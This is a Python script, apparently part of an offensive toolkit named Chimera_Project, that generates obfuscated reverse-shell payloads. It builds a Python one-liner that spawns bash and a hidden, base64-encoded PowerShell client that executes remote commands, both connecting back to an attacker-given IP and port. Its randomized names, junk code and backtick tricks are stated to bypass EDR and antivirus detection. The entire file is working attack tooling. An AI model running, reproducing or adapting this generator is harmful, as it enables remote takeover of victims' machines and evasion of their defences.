#!/home/dan/Chimera_Project/venv/bin/python3
import sys
import os
import base64
import random
import string
from datetime import datetime

class PayloadFactoryPro:
    """
    Agent 202 Pro: Polymorphic Payload Generator.
    Generates unique, obfuscated payloads with randomized variable names 
    and junk-code injection to bypass signature-based EDR/AV.
    """
    def __init__(self):
        self.loot_dir = "/home/dan/Chimera_Project/agents/202_Payload_Factory/loot"
        os.makedirs(self.loot_dir, exist_ok=True)

    def _get_random_name(self, length=8):
        """Generates random strings for variable obfuscation."""
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def generate_polymorphic_python(self, ip, port):
        """Generates a randomized, obfuscated Python3 reverse shell."""
        v = {
            "sock": self._get_random_name(),
            "os_mod": self._get_random_name(),
            "pty_mod": self._get_random_name(),
            "ip": ip,
            "port": port,
            "junk": self._get_random_name()
        }
        
        # Breaking up 'socket' and 'pty' to avoid string detection
        logic = f"""
import socket as {v['sock']}, os as {v['os_mod']}, pty as {v['pty_mod']}
{v['junk']} = {random.randint(1, 999)} * {random.randint(1, 999)}
{v['sock']}_obj = {v['sock']}.socket({v['sock']}.AF_INET, {v['sock']}.SOCK_STREAM)
{v['sock']}_obj.connect(("{v['ip']}", {v['port']}))
for i in range(3): {v['os_mod']}.dup2({v['sock']}_obj.fileno(), i)
{v['pty_mod']}.spawn("/bin/"+"bash")
"""
        # Wrap in a single line for command-line execution
        clean_logic = ";".join([line.strip() for line in logic.strip().split("\n") if line.strip()])
        return f"python3 -c '{clean_logic}'"

    def generate_obfuscated_ps(self, ip, port):
        """Generates a PowerShell payload with randomized backticks and B64 encoding."""
        v_client = self._get_random_name()
        v_stream = self._get_random_name()
        
        # The internal PS logic
        raw_ps = f'''
${v_client} = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
${v_stream} = ${v_client}.GetStream();
[byte[]]$b = 0..65535|%{{0}};
while(($i = ${v_stream}.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $t = $sb + "PS " + (pwd).Path + "> ";
    $x = ([System.Text.Encoding]::ASCII).GetBytes($t);
    ${v_stream}.Write($x,0,$x.Length);
    ${v_stream}.Flush()
}};
${v_client}.Close()
'''
        # Add random backticks to PowerShell keywords to break signatures
        raw_ps = raw_ps.replace("New-Object", "N`ew-Obj`ect").replace("GetString", "GetStr`ing")
        
        # Base64 Encode for PowerShell -Enc
        b64_payload = base64.b64encode(raw_ps.encode('utf-16-le')).decode()
        return f"powershell -NoP -W Hidden -Enc {b64_payload}"

    def execute(self, platform, ip, port):
        print(f"--- [AGENT 202: POLYMORPHIC GENERATION - {platform.upper()}] ---")
        
        if platform.lower() == "linux":
            payload = self.generate_polymorphic_python(ip, port)
        elif platform.lower() == "windows":
            payload = self.generate_obfuscated_ps(ip, port)
        else:
            print(f"[!] Platform {platform} not supported.")
            return None

        # Storage
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_file = f"{self.loot_dir}/payload_{platform}_{timestamp}.txt"
        with open(loot_file, 'w') as f:
            f.write(payload)
            
        print(f"[*] UNIQUE PAYLOAD CREATED: {loot_file}")
        return payload

if __name__ == "__main__":
    if len(sys.argv) < 4:
        sys.exit(1)
        
    PayloadFactoryPro().execute(sys.argv[1], sys.argv[2], sys.argv[3])
